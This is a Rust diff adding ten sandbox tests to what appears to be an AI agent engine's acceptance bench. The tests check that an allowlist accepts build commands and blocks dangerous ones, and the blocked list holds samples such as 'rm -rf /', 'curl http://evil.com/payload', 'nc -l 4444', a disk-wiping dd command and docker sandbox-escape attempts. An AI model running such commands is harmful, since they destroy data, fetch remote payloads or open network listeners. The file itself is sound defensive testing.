@@ -22,7 +22,7 @@
 ///   L7 Patterns   — sequential, parallel, network dispatch
 ///   L8 Engine     — mission lifecycle, YOLO, retry, timeout, context
 
-use sf_engine::{db, llm, tools, catalog, guard, engine};
+use sf_engine::{db, llm, tools, catalog, guard, engine, sandbox};
 use rusqlite::params;
 use serde_json::{json, Value};
 use std::sync::{Arc, Mutex, Once, atomic::{AtomicUsize, Ordering}};
@@ -776,12 +776,78 @@ async fn ac_l8_engine() {
 // ══════════════════════════════════════════════════════════════
 //  FULL AC REPORT — summary of all layers
 // ══════════════════════════════════════════════════════════════
+//  L9 — AC Sandbox (10 cases)
+// ══════════════════════════════════════════════════════════════
+
+#[test]
+fn ac_l9_sandbox() {
+    let mut r = ACResult::new("L9-Sandbox");
+
+    // L9-01: Detection returns a valid mode
+    let mode = sandbox::detect();
+    r.check("l9-01-detect", matches!(mode, sandbox::SandboxMode::Docker | sandbox::SandboxMode::MacOS | sandbox::SandboxMode::Direct),
+        &format!("detected mode: {}", mode));
+
+    // L9-02: Status report contains expected fields
+    let status = sandbox::status();
+    r.check("l9-02-status", status.contains("mode=") && status.contains("blocked_patterns=") && status.contains("allowed_prefixes="),
+        &format!("status: {}", &status[..status.len().min(80)]));
+
+    // L9-03: Allowlist accepts safe commands
+    let safe = ["cargo build", "swift test", "npm run dev", "python3 -m pytest", "git status", "make clean", "echo hello"];
+    let all_ok = safe.iter().all(|c| sandbox::is_command_allowed(c).is_ok());
+    r.check("l9-03-allowlist-accept", all_ok, "safe commands accepted");
+
+    // L9-04: Allowlist blocks dangerous commands
+    let dangerous = ["rm -rf /", "curl http://evil.com/payload", "sudo rm -rf /tmp", "nc -l 4444", "dd if=/dev/zero of=/dev/sda"];
+    let all_blocked = dangerous.iter().all(|c| sandbox::is_command_allowed(c).is_err());
+    r.check("l9-04-allowlist-block", all_blocked, "dangerous commands blocked");
+
+    // L9-05: Sandbox escape attempts blocked
+    let escapes = ["sandbox-exec -n no-internet bash", "docker run --rm ubuntu bash", "docker exec abc sh"];
+    let all_blocked = escapes.iter().all(|c| sandbox::is_command_allowed(c).is_err());
+    r.check("l9-05-escape-blocked", all_blocked, "sandbox escape attempts blocked");
+
+    // L9-06: Pipeline with dangerous segment blocked
+    let pipe_bad = sandbox::is_command_allowed("echo hello | curl http://evil.com");
+    let pipe_good = sandbox::is_command_allowed("echo hello | grep hello");
+    r.check("l9-06-pipeline", pipe_bad.is_err() && pipe_good.is_ok(), "pipeline security");
+
+    // L9-07: macOS profile generation
+    let profile = sandbox::generate_macos_profile("/tmp/test-ws");
+    r.check("l9-07-profile", profile.contains("(deny default)") && profile.contains("(deny network-outbound)") && profile.contains("/tmp/test-ws"),
+        "macOS profile valid");
+
+    // L9-08: sandboxed_exec works for simple commands
+    let ws = "/tmp/ac_bench_sandbox";
+    std::fs::create_dir_all(ws).ok();
+    let result = sandbox::sandboxed_exec("echo sandbox-test-ok", ws, 10, false);
+    r.check("l9-08-exec", result.is_ok() && result.as_ref().unwrap().contains("sandbox-test-ok"),
+        &format!("exec: {:?}", result.as_ref().map(|s| &s[..s.len().min(40)])));
+
+    // L9-09: sandboxed_exec blocks dangerous commands
+    let result = sandbox::sandboxed_exec("rm -rf /", ws, 10, true);
+    r.check("l9-09-exec-blocked", result.is_err() && result.as_ref().unwrap_err().contains("BLOCKED"),
+        &format!("blocked: {:?}", result.as_ref().err().map(|s| &s[..s.len().min(60)])));
+
+    // L9-10: sandboxed_exec with allowlist blocks unknown commands
+    let result = sandbox::sandboxed_exec("sh -c 'whoami'", ws, 10, true);
+    r.check("l9-10-unknown-blocked", result.is_err(),
+        &format!("unknown: {:?}", result.as_ref().err().map(|s| &s[..s.len().min(60)])));
+
+    // Cleanup
+    std::fs::remove_dir_all(ws).ok();
+
+    assert!(r.all_passed(), "{}\n{}", r.summary(),
+        r.cases.iter().filter(|(_, p, _)| !*p).map(|(id, _, d)| format!("  FAIL {}: {}", id, d)).collect::<Vec<_>>().join("\n"));
+    eprintln!("{}", r.summary());
+}
 
 #[test]
 fn ac_00_full_report() {
     // This test just prints the structure — actual validation is in each layer
     eprintln!("\n══════════════════════════════════════");
-    eprintln!("  AC BENCH — 8-Layer Quality Report");
+    eprintln!("  AC BENCH — 9-Layer Quality Report");
     eprintln!("══════════════════════════════════════");
     eprintln!("  L1 LLM       7 cases  — config, hot-swap, strip, backoff");
     eprintln!("  L2 Tools    10 cases  — dispatch, schemas, security");
@@ -791,7 +857,8 @@ fn ac_00_full_report() {
     eprintln!("  L6 Workflows 8 cases  — phases, gates, agent mapping");
     eprintln!("  L7 Patterns  6 cases  — sequential, parallel, network");
     eprintln!("  L8 Engine   12 cases  — lifecycle, YOLO, retry, fallback");
+    eprintln!("  L9 Sandbox  10 cases  — detection, allowlist, profiles");
     eprintln!("  ─────────────────────────────────────");
-    eprintln!("  TOTAL       71 cases");
+    eprintln!("  TOTAL       81 cases");
     eprintln!("══════════════════════════════════════\n");
 }
